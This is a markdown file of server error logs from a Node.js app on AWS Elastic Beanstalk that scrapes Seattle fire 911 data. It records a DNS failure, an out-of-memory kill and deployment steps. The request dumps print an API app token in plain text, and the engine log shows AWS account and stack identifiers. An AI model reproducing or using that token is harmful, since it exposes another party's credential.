# Errors

## 2020-08-01

```
Aug  1 20:33:26 ip-172-31-4-106 web: [1] main > (7111ms), restarting in 60sec
Aug  1 20:34:26 ip-172-31-4-106 web: [1] main > memory usage: pid: 12047, title: node
Aug  1 20:34:26 ip-172-31-4-106 web: [1] #011rss 151.18 MB
Aug  1 20:34:26 ip-172-31-4-106 web: [1] #011heapTotal 62.76 MB
Aug  1 20:34:26 ip-172-31-4-106 web: [1] #011heapUsed 56.87 MB
Aug  1 20:34:26 ip-172-31-4-106 web: [1] #011external 22.42 MB
Aug  1 20:34:26 ip-172-31-4-106 web: [1] #011arrayBuffers 20.52 MB
Aug  1 20:34:26 ip-172-31-4-106 web: [1] >> updateOnce >  started
Aug  1 20:34:26 ip-172-31-4-106 web: [1] update > status {
Aug  1 20:34:26 ip-172-31-4-106 web: [1]   update: { lastRun: '2020-08-01T20:33:21.328Z' },
Aug  1 20:34:26 ip-172-31-4-106 web: [1]   split: { lastRun: '2020-08-01T20:33:22.186Z' }
Aug  1 20:34:26 ip-172-31-4-106 web: [1] }
Aug  1 20:34:26 ip-172-31-4-106 web: [1] update > most recent: 2020-08-01T00:00:00.000Z.json
Aug  1 20:34:26 ip-172-31-4-106 web: [1] update > reading: /var/app/current/datasets/official/2020-08-01T00:00:00.000Z.json
Aug  1 20:34:26 ip-172-31-4-106 web: [1] update > dates: [
Aug  1 20:34:26 ip-172-31-4-106 web: [1]   2020-07-31T07:00:00.000Z,
Aug  1 20:34:26 ip-172-31-4-106 web: [1]   2020-08-01T07:00:00.000Z,
Aug  1 20:34:26 ip-172-31-4-106 web: [1]   2020-08-02T07:00:00.000Z
Aug  1 20:34:26 ip-172-31-4-106 web: [1] ]
Aug  1 20:34:26 ip-172-31-4-106 web: [1] update > date strings: [ '7/31/2020', '8/1/2020', '8/2/2020' ]
Aug  1 20:34:26 ip-172-31-4-106 web: [1] >> scrapeDate > 7/31/2020
Aug  1 20:34:27 ip-172-31-4-106 web: [1] >> scrapeDate > 7/31/2020 rows:  302
Aug  1 20:34:27 ip-172-31-4-106 web: [1] >> scrapeDate > 7/31/2020 -> 302 (1403ms)
Aug  1 20:34:27 ip-172-31-4-106 web: [1] >> scrapeDate > 8/1/2020
Aug  1 20:34:28 ip-172-31-4-106 web: [1] >> scrapeDate > 8/1/2020 rows:  121
Aug  1 20:34:28 ip-172-31-4-106 web: [1] >> scrapeDate > 8/1/2020 -> 121 (607ms)
Aug  1 20:34:28 ip-172-31-4-106 web: [1] >> scrapeDate > 8/2/2020
Aug  1 20:34:28 ip-172-31-4-106 web: [1] >> scrapeDate > Warning: Cannot read property 'children' of null
Aug  1 20:34:28 ip-172-31-4-106 web: [1] update > 2079ms
Aug  1 20:34:28 ip-172-31-4-106 web: [1] combine > 423 --> 348 (85ms)
Aug  1 20:34:28 ip-172-31-4-106 web: [1] database > downloaded 347 entries in 0.208 sec
Aug  1 20:34:28 ip-172-31-4-106 web: [1] >> resolveLocally > resolved 347 out of 348
Aug  1 20:34:28 ip-172-31-4-106 web: [1] resolve > requesting 1 out of 1
Aug  1 20:34:28 ip-172-31-4-106 web: [1] resolve > IDs: F200075589
Aug  1 20:34:28 ip-172-31-4-106 web: [1] resolve > 1 ids (URI length: 174)
Aug  1 20:34:28 ip-172-31-4-106 web: [1] data.seattle.gov call failed: Error: getaddrinfo ENOTFOUND data.seattle.gov
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     at GetAddrInfoReqWrap.onlookup [as oncomplete] (dns.js:66:26) {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   errno: 'ENOTFOUND',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   code: 'ENOTFOUND',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   syscall: 'getaddrinfo',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   hostname: 'data.seattle.gov',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   config: {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     url: 'https://data.seattle.gov/resource/fire-911.json?$$app_token=DvY4gobAudCWKcwYz3yqTd25h&$select=incident_number,latitude,longitude&$where=incident_number%20in(%22F200075589%22)',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     method: 'get',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     headers: {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       Accept: 'application/json, text/plain, */*',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       'User-Agent': 'axios/0.19.2'
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     transformRequest: [ [Function: transformRequest] ],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     transformResponse: [ [Function: transformResponse] ],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     timeout: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     adapter: [Function: httpAdapter],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     xsrfCookieName: 'XSRF-TOKEN',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     xsrfHeaderName: 'X-XSRF-TOKEN',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     maxContentLength: -1,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     validateStatus: [Function: validateStatus],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     data: undefined
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   request: Writable {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _writableState: WritableState {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       objectMode: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       highWaterMark: 16384,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       finalCalled: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       needDrain: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       ending: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       ended: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       finished: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       destroyed: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       decodeStrings: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       defaultEncoding: 'utf8',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       length: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       writing: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       corked: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       sync: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       bufferProcessing: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       onwrite: [Function: bound onwrite],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       writecb: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       writelen: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       afterWriteTickInfo: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       bufferedRequest: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       lastBufferedRequest: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       pendingcb: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       prefinished: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       errorEmitted: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       emitClose: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       autoDestroy: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       bufferedRequestCount: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       corkedRequestsFree: [Object]
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     writable: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _events: [Object: null prototype] {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       response: [Function: handleResponse],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       error: [Function: handleRequestError]
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _eventsCount: 2,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _maxListeners: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _options: {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       protocol: 'https:',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       maxRedirects: 21,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       maxBodyLength: 10485760,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       path: '/resource/fire-911.json?$$app_token=DvY4gobAudCWKcwYz3yqTd25h&$select=incident_number,latitude,longitude&$where=incident_number%20in(%22F200075589%22)',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       method: 'GET',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       headers: [Object],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       agent: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       agents: [Object],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       auth: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       hostname: 'data.seattle.gov',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       port: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       nativeProtocols: [Object],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       pathname: '/resource/fire-911.json',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       search: '?$$app_token=DvY4gobAudCWKcwYz3yqTd25h&$select=incident_number,latitude,longitude&$where=incident_number%20in(%22F200075589%22)'
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _redirectCount: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _redirects: [],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _requestBodyLength: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _requestBodyBuffers: [],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _onNativeResponse: [Function],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _currentRequest: ClientRequest {
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _events: [Object: null prototype],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _eventsCount: 6,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _maxListeners: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       outputData: [],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       outputSize: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       writable: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _last: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       chunkedEncoding: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       shouldKeepAlive: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       useChunkedEncodingByDefault: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       sendDate: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _removedConnection: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _removedContLen: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _removedTE: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _contentLength: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _hasBody: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _trailer: '',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       finished: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _headerSent: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       socket: [TLSSocket],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       connection: [TLSSocket],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _header: 'GET /resource/fire-911.json?$$app_token=DvY4gobAudCWKcwYz3yqTd25h&$select=incident_number,latitude,longitude&$where=incident_number%20in(%22F200075589%22) HTTP/1.1\r\n' +
Aug  1 20:34:28 ip-172-31-4-106 web: [1]         'Accept: application/json, text/plain, */*\r\n' +
Aug  1 20:34:28 ip-172-31-4-106 web: [1]         'User-Agent: axios/0.19.2\r\n' +
Aug  1 20:34:28 ip-172-31-4-106 web: [1]         'Host: data.seattle.gov\r\n' +
Aug  1 20:34:28 ip-172-31-4-106 web: [1]         'Connection: close\r\n' +
Aug  1 20:34:28 ip-172-31-4-106 web: [1]         '\r\n',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _onPendingData: [Function: noopPendingOutput],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       agent: [Agent],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       socketPath: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       method: 'GET',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       insecureHTTPParser: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       path: '/resource/fire-911.json?$$app_token=DvY4gobAudCWKcwYz3yqTd25h&$select=incident_number,latitude,longitude&$where=incident_number%20in(%22F200075589%22)',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _ended: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       res: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       aborted: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       timeoutCb: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       upgradeOrConnect: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       parser: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       maxHeadersCount: null,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       reusedSocket: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       _redirectable: [Circular],
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       [Symbol(kCapture)]: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       [Symbol(kNeedDrain)]: false,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       [Symbol(corked)]: 0,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]       [Symbol(kOutHeaders)]: [Object: null prototype]
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     _currentUrl: 'https://data.seattle.gov/resource/fire-911.json?$$app_token=DvY4gobAudCWKcwYz3yqTd25h&$select=incident_number,latitude,longitude&$where=incident_number%20in(%22F200075589%22)',
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     [Symbol(kCapture)]: false
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   },
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   response: undefined,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   isAxiosError: true,
Aug  1 20:34:28 ip-172-31-4-106 web: [1]   toJSON: [Function]
Aug  1 20:34:28 ip-172-31-4-106 web: [1] } Error: getaddrinfo ENOTFOUND data.seattle.gov
Aug  1 20:34:28 ip-172-31-4-106 web: [1]     at GetAddrInfoReqWrap.onlookup [as oncomplete] (dns.js:66:26)
Aug  1 20:34:28 ip-172-31-4-106 web: [1] resolve >>> stopped due to error: getaddrinfo ENOTFOUND data.seattle.gov
Aug  1 20:34:28 ip-172-31-4-106 web: [1] main >>> stopped due to error: nhoods > No source file provided
Aug  1 20:34:28 ip-172-31-4-106 web: [1] npm run backgroundTasks exited with code 0
```

## 2020-07-17

```
Jul 17 11:44:47 ip-172-31-4-106 web: [1] [0] main > (7494ms), restarting in 90sec
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] >> updateOnce >  started
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] update > status {
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0]   update: { lastRun: '2020-07-17T11:44:42.611Z' },
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0]   split: { lastRun: '2020-07-17T11:44:43.483Z' }
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] }
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] update > most recent: 2020-07-17T00:00:00.000Z.json
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] update > reading: /var/app/current/datasets/official/2020-07-17T00:00:00.000Z.json
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] update > dates: [
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0]   2020-07-16T07:00:00.000Z,
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0]   2020-07-17T07:00:00.000Z,
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0]   2020-07-18T07:00:00.000Z
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] ]
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] update > date strings: [ '7/16/2020', '7/17/2020', '7/18/2020' ]
Jul 17 11:46:17 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/16/2020
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/16/2020 rows:  270
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/16/2020 -> 270 (1347ms)
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/17/2020
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/17/2020 rows:  51
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/17/2020 -> 51 (500ms)
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > 7/18/2020
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> scrapeDate > Warning: Cannot read property 'children' of null
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] update > 1914ms
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] combine > 321 --> 261 (55ms)
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] >> resolveLocally > resolved 246 out of 261
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] resolve > requesting 15 out of 15
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] resolve > IDs: F200069909,F200069592,F200069591,F200069590,F200069589,F200069588,F200069587,F200069586,F200069585,F200069583,F200069582,F200069581,F200069579,F200069580,F200069577
Jul 17 11:46:19 ip-172-31-4-106 web: [1] [0] resolve > 15 ids (URI length: 412)
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] >> cleanup unresolved > 397 -> 397
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] resolve > new totals: resolved: 261, unresolved: 397 (635ms)
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] nhoods > resolved in 57ms
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] split > split 261 entries across 2 files (8ms) :
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0]  [ '2020-07-17T00:00:00.000Z', '2020-07-16T00:00:00.000Z' ]
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] split > 104 entries to 2020-07-17T00:00:00.000Z
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] split > 157 entries to 2020-07-16T00:00:00.000Z
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 104 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 104 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 104 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 104 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 104 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 104 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 2 files: 354 total entries
Jul 17 11:46:20 ip-172-31-4-106 web: [1] [0] read 8 files: 1433 total entries
Jul 17 11:46:21 ip-172-31-4-106 web: [1] [0] read 732 files: 133641 total entries
Jul 17 11:46:23 ip-172-31-4-106 web: [1] [1] read 732 files: 133641 total entries
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] sh: line 1:  1985 Killed                  node -r esm main.js
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! code ELIFECYCLE
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! errno 137
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! scripts@0.2.0 update:loop: `cd official && node -r esm main.js`
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! Exit status 137
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR!
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! Failed at the scripts@0.2.0 update:loop script.
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! This is probably not a problem with npm. There is likely additional logging output above.
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0]
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR! A complete log of this run can be found in:
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm ERR!     /home/webapp/.npm/_logs/2020-07-17T11_52_37_906Z-debug.log
Jul 17 11:52:37 ip-172-31-4-106 web: [1] [0] npm run update:loop exited with code 137
Jul 17 11:52:40 ip-172-31-4-106 web: [1] [1] annotate > (377902ms)
Jul 17 11:52:40 ip-172-31-4-106 web: [1] [1] slowrunners > (377903ms), restarting in 3661.2sec
```

## 2020-08-23

```
----------------------------------------
/var/log/eb-engine.log
----------------------------------------
2020/08/11 08:01:57.143552 [INFO] Copying file /opt/elasticbeanstalk/config/private/rsyslog.conf to /etc/rsyslog.d/web.conf
2020/08/11 08:01:57.144618 [INFO] Running command /bin/sh -c systemctl restart rsyslog.service
2020/08/11 08:01:57.162488 [INFO] Executing instruction: PostBuildEbExtension
2020/08/11 08:01:57.162531 [INFO] Starting executing the config set Infra-EmbeddedPostBuild.
2020/08/11 08:01:57.162555 [INFO] Running command /bin/sh -c /opt/aws/bin/cfn-init -s arn:aws:cloudformation:us-west-2:735927883851:stack/awseb-e-5vtssnjjs7-immutable-stack/b389e990-dba8-11ea-b7bc-0aa772971980 -r AWSEBAutoScalingGroup --region us-west-2 --configsets Infra-EmbeddedPostBuild
2020/08/11 08:01:57.486687 [INFO] Finished executing the config set Infra-EmbeddedPostBuild.

2020/08/11 08:01:57.486714 [INFO] Executing instruction: CleanEbExtensions
2020/08/11 08:01:57.486748 [INFO] Cleaned ebextensions subdirectories from app staging directory.
2020/08/11 08:01:57.486753 [INFO] Executing instruction: RunAppDeployPreDeployHooks
2020/08/11 08:01:57.486761 [INFO] The dir .platform/hooks/predeploy/ does not exist in the application. Skipping this step...
2020/08/11 08:01:57.486765 [INFO] Executing instruction: stop X-Ray
2020/08/11 08:01:57.486781 [INFO] stop X-Ray ...
2020/08/11 08:01:57.486800 [INFO] Running command /bin/sh -c systemctl show -p PartOf xray.service
2020/08/11 08:01:57.493840 [WARN] stopProcess Warning: process xray is not registered
2020/08/11 08:01:57.493858 [INFO] Running command /bin/sh -c systemctl stop xray.service
2020/08/11 08:01:57.501459 [INFO] Executing instruction: stop proxy
2020/08/11 08:01:57.501488 [INFO] Running command /bin/sh -c systemctl show -p PartOf httpd.service
2020/08/11 08:01:57.509029 [WARN] deregisterProcess Warning: process httpd is not registered, skipping...

2020/08/11 08:01:57.509052 [INFO] Running command /bin/sh -c systemctl show -p PartOf nginx.service
2020/08/11 08:01:57.515320 [WARN] deregisterProcess Warning: process nginx is not registered, skipping...

2020/08/11 08:01:57.515337 [INFO] Executing instruction: FlipApplication
2020/08/11 08:01:57.515343 [INFO] Fetching environment variables...
2020/08/11 08:01:57.515350 [INFO] setting default port 8080 to application
2020/08/11 08:01:57.515445 [INFO] Purge old process...
2020/08/11 08:01:57.515475 [INFO] Register application processes...
2020/08/11 08:01:57.515480 [INFO] Registering the proc: web

2020/08/11 08:01:57.515495 [INFO] Running command /bin/sh -c systemctl show -p PartOf web.service
2020/08/11 08:01:57.521411 [INFO] Running command /bin/sh -c systemctl daemon-reload
2020/08/11 08:01:57.604455 [INFO] Running command /bin/sh -c systemctl reset-failed
2020/08/11 08:01:57.609001 [INFO] Running command /bin/sh -c systemctl is-enabled eb-app.target
2020/08/11 08:01:57.612760 [INFO] Copying file /opt/elasticbeanstalk/config/private/aws-eb.target to /etc/systemd/system/eb-app.target
2020/08/11 08:01:57.614158 [INFO] Running command /bin/sh -c systemctl enable eb-app.target
2020/08/11 08:01:57.683680 [INFO] Running command /bin/sh -c systemctl start eb-app.target
2020/08/11 08:01:57.689222 [INFO] Running command /bin/sh -c systemctl enable web.service
2020/08/11 08:01:57.759124 [INFO] Running command /bin/sh -c systemctl show -p PartOf web.service
2020/08/11 08:01:57.764783 [INFO] Running command /bin/sh -c systemctl is-active web.service
2020/08/11 08:01:57.768731 [INFO] Running command /bin/sh -c systemctl start web.service
2020/08/11 08:01:57.817255 [INFO] Executing instruction: start X-Ray
2020/08/11 08:01:57.817272 [INFO] X-Ray is not enabled.
2020/08/11 08:01:57.817277 [INFO] Executing instruction: start proxy with new configuration
2020/08/11 08:01:57.817304 [INFO] Running command /bin/sh -c /usr/sbin/nginx -t -c /var/proxy/staging/nginx/nginx.conf
2020/08/11 08:01:57.843991 [INFO] Running command /bin/sh -c cp -rp /var/proxy/staging/nginx/* /etc/nginx
2020/08/11 08:01:57.852942 [INFO] Running command /bin/sh -c systemctl show -p PartOf nginx.service
2020/08/11 08:01:57.866952 [INFO] Running command /bin/sh -c systemctl daemon-reload
2020/08/11 08:01:57.983555 [INFO] Running command /bin/sh -c systemctl reset-failed
2020/08/11 08:01:57.991190 [INFO] Running command /bin/sh -c systemctl show -p PartOf nginx.service
2020/08/11 08:01:58.001452 [INFO] Running command /bin/sh -c systemctl is-active nginx.service
2020/08/11 08:01:58.019355 [INFO] Running command /bin/sh -c systemctl start nginx.service
2020/08/11 08:01:58.136663 [INFO] Executing instruction: configureSqsd
2020/08/11 08:01:58.136681 [INFO] This is a web server environment instance, skip configure sqsd daemon ...
2020/08/11 08:01:58.136685 [INFO] Executing instruction: startSqsd
2020/08/11 08:01:58.136689 [INFO] This is a web server environment instance, skip start sqsd daemon ...
2020/08/11 08:01:58.136694 [INFO] Executing instruction: Track pids in healthd
2020/08/11 08:01:58.136699 [INFO] This is an enhanced health env...
2020/08/11 08:01:58.136718 [INFO] Running command /bin/sh -c systemctl show -p ConsistsOf aws-eb.target | cut -d= -f2
2020/08/11 08:01:58.148123 [INFO] nginx.service cfn-hup.service healthd.service

2020/08/11 08:01:58.148165 [INFO] Running command /bin/sh -c systemctl show -p ConsistsOf eb-app.target | cut -d= -f2
2020/08/11 08:01:58.161655 [INFO] web.service

2020/08/11 08:01:58.161834 [INFO] Executing instruction: RunAppDeployPostDeployHooks
2020/08/11 08:01:58.161846 [INFO] The dir .platform/hooks/postdeploy/ does not exist in the application. Skipping this step...
2020/08/11 08:01:58.161851 [INFO] Executing cleanup logic
2020/08/11 08:01:58.162009 [INFO] Platform Engine finished execution on command: self-startup

2020/08/11 08:06:58.214499 [INFO] Starting...
2020/08/11 08:06:58.214958 [INFO] Starting EBPlatform-PlatformEngine
2020/08/11 08:06:58.215934 [INFO] reading event message file
2020/08/11 08:06:58.217811 [INFO] no eb envtier info file found, skip loading env tier info.
2020/08/11 08:06:58.217913 [INFO] Engine received EB command cfn-hup-exec

2020/08/11 08:06:58.318335 [INFO] Skipping populate manifest for light execution
2020/08/11 08:06:58.318359 [INFO] Engine command: (switch-cfn-stack)

2020/08/11 08:06:58.320062 [INFO] Executing instruction: Switch CFN Stack
2020/08/11 08:06:58.320069 [INFO] Starting SwitchCFNStack
2020/08/11 08:06:58.324452 [INFO] Executing cleanup logic
2020/08/11 08:06:58.324540 [INFO] CommandService Response: {"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"Engine execution has succeeded.","returncode":0,"events":[{"msg":"Instance deployment completed successfully.","timestamp":1597133218,"severity":"INFO"}]}]}

2020/08/11 08:06:58.324554 [INFO] Platform Engine finished execution on command: switch-cfn-stack

2020/08/23 19:24:42.064883 [INFO] Starting...
2020/08/23 19:24:42.065440 [INFO] Starting EBPlatform-PlatformEngine
2020/08/23 19:24:42.066101 [INFO] reading event message file
2020/08/23 19:24:42.066716 [INFO] no eb envtier info file found, skip loading env tier info.
2020/08/23 19:24:42.066838 [INFO] Engine received EB command cfn-hup-exec

2020/08/23 19:24:42.182377 [INFO] Running command /bin/sh -c /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-west-2:735927883851:stack/awseb-e-5vtssnjjs7-stack/f4dccbb0-b18c-11ea-9dc6-02e5d6ab406e -r AWSEBAutoScalingGroup --region us-west-2
2020/08/23 19:24:42.538008 [INFO] Running command /bin/sh -c /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:us-west-2:735927883851:stack/awseb-e-5vtssnjjs7-stack/f4dccbb0-b18c-11ea-9dc6-02e5d6ab406e -r AWSEBBeanstalkMetadata --region us-west-2
2020/08/23 19:24:42.838287 [INFO] checking whether command tail-log is applicable to this instance...
2020/08/23 19:24:42.838303 [INFO] this command is applicable to the instance, thus instance should execute command
2020/08/23 19:24:42.838328 [INFO] Engine command: (tail-log)

2020/08/23 19:24:42.839033 [INFO] Executing instruction: GetTailLogs
2020/08/23 19:24:42.839042 [INFO] Tail Logs...
2020/08/23 19:24:42.840742 [INFO] Running command /bin/sh -c tail -n 100 /var/log/eb-engine.log


----------------------------------------
/var/log/web.stdout.log
----------------------------------------
